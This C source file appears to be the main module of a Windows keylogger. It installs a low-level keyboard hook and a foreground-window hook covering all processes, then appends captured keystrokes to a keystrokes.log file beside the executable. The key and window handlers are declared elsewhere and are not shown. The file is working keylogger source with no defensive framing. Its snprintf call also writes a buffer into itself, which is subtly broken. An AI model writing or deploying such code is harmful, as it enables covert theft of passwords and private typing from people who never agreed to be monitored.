#include "winkey.h"

HHOOK           g_keyboard_hook;
HWINEVENTHOOK   g_window_hook;
FILE*           g_logfile;
HWND            g_last_window = NULL;
HWND            g_foreground_window = NULL;
char            g_process_name[MAX_PATH] = "";
char            g_window_title[256];

int main(int argc, char* argv[])
{
    if (argc == 0 || argv[0] == NULL)
        return 1;

    char log_path[MAX_PATH] = { 0 };

    // Get the full path of the executable file
    // and then find the last backslash in the path
    // to isolate the directory.
    GetModuleFileName(NULL, log_path, MAX_PATH);
    char* last_backslash = strrchr(log_path, '\\');
    if (last_backslash) {
        *last_backslash = '\0';
    }

    // Construct the full path to the log file (keystrokes.log) in the same directory as the executable.
    snprintf(log_path, MAX_PATH, "%s\\keystrokes.log", log_path);

    // Open the log file for appending. Create it if it doesn't exist.
    g_logfile = fopen(log_path, "a");
    if (g_logfile == NULL) {
        return 1;
    }

    // Set a Windows event hook to monitor changes in the foreground window (e.g., when the active window changes).
    g_window_hook = SetWinEventHook(
        EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,   // Monitor only foreground window change events.
        NULL,                                               // No DLL handle is needed as the callback is in the same process.
        handle_fg_window_change,                            // The callback function to handle window changes.
        0, 0,                                               // Monitor all processes and threads.
        WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);   // Flags to specify how the hook is managed.

    // Set a low-level keyboard hook to monitor all keyboard events.
    g_keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, handle_key_press, NULL, 0);
    if (g_keyboard_hook == NULL || g_window_hook == NULL) {
        fclose(g_logfile);
        return 1;
    }

    // Initialize by manually triggering the window change handler for the current foreground window.
    handle_fg_window_change(NULL, 0, GetForegroundWindow(), 0, 0, 0, 0);

    // Enter the message loop to keep the hooks active.
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {}

    // Cleanup: Unhook the event and keyboard hooks and close the log file before exiting.
    UnhookWinEvent(g_window_hook);
    UnhookWindowsHookEx(g_keyboard_hook);
    fclose(g_logfile);
    return 0;
}
